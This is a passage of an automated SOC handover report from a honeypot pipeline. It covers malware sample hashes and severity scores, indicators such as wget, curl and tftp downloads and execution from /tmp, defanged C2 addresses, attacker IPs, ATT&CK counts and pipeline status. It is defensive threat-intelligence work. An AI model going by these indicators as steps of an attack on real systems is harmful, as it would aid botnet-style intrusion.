| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `207.56.229[.]202` | JP | NTT America, Inc. | **100** ⚠️ | 1 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `36.137.38[.]119` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `92.118.39[.]77` | RO | DMZHOST | **100** ⚠️ | 50 |
| `111.70.32[.]8` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `192.34.128[.]202` | US | Zito Media | **100** ⚠️ | 50 |
| `196.204.71[.]189` | EG | Local ISP | **100** ⚠️ | 50 |
| `211.22.222[.]251` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `45.33.109[.]8` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 119 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 92 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 35 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 34 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 34 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 158 cases |
| Tool 34  | Credential Extractor        | ✅ 112 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (17.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 92 priority case(s) shown individually · 20 recon entry/entries in table (9 group(s) consolidating 28 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-15T21:05:13Z_
